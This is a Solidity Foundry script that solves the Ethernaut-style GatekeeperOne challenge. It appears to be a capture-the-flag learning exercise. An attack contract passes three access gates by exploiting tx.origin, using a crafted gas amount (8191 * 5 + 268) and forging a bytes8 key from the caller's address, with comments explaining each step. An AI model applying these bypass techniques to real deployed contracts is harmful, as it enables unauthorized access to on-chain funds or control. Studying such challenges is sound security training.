// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneSolution is Script {
    // $ forge script script/GatekeeperOne.s.sol --tc GatekeeperOneSolution

    GatekeeperOne gateKeeperInstance;
    GateKeeperAttack attackContract;

    function run() external {
        gateKeeperInstance = new GatekeeperOne();
        attackContract = new GateKeeperAttack(address(gateKeeperInstance));

        // - To unlock the contract we need to pass three checks:

        // - The first check `gateOne` can be passed by making an indirect call to the function (call a smart contract that calls the function). As this will make the `tx.origin` differs from the `msg.sender`.

        // - The second check `gateTwo` can be passed by sending a gas value divisable by 8191. We can calculate the amount of gas that will be used by the first check, and pass a gas value = multiple of 8191 + the amount of gas used in the first check.

        // - The third check, which is the hardest one, checks that the `gateKey` (bytes8) passed should match the following things
        //      - We will extract the last 2 bytes of the tx.origin address first.
        //      - Then, adding it to a uint64 number >= 2 ** 32

        // By this steps we will have the following bytes8 variable: [NON_ZERO_NUMBER][0000][LAST_2_BYTES_Of_TX.ORIGIN]
        // This formate will pass the three checks in the third gate modifier, which existed in the GatekeeperOne contract.
        // For more info, you can check out the solution in the GitHub repo

        console.log("entrant:", gateKeeperInstance.entrant());
        attackContract.attack();
        console.log("entrant:", gateKeeperInstance.entrant());

        // -----------------
    }
}

contract GateKeeperAttack {
    GatekeeperOne gateKeeperInstance;

    constructor(address target) {
        gateKeeperInstance = GatekeeperOne(target);
    }

    function attack() public {
        bytes2 originAddressLast2Bytes = bytes2(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(uint64(uint16(originAddressLast2Bytes)) + 2 ** 32);

        // taking tx.origin = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38
        // -------------------------------
        // gateKey = 0x0000000100001f38
        // 0x0000000100001f38
        // 1f38 ==> The last left 2 bytes of the tx.origin to match
        // After this, 4 zeros in hexa (2bytes) to make casting to this uint16 == casting to uint32
        // After this, there is 0x00000001, and this is to make casting to uint64 != casting to uint32
        // So we will pass the three checks in the gateThree modifier

        // We calculated the gas used by the `gateOne` modifier, and it is 268.
        // You can import `forge-std/console.sol` in the contract and calculate it by this way.
        // So we need to pass gas divisible by 8191 and adding 268 to it, to path the `gateTwo` modifier check.
        gateKeeperInstance.enter{gas: 8191 * 5 + 268}(gateKey);
    }
}
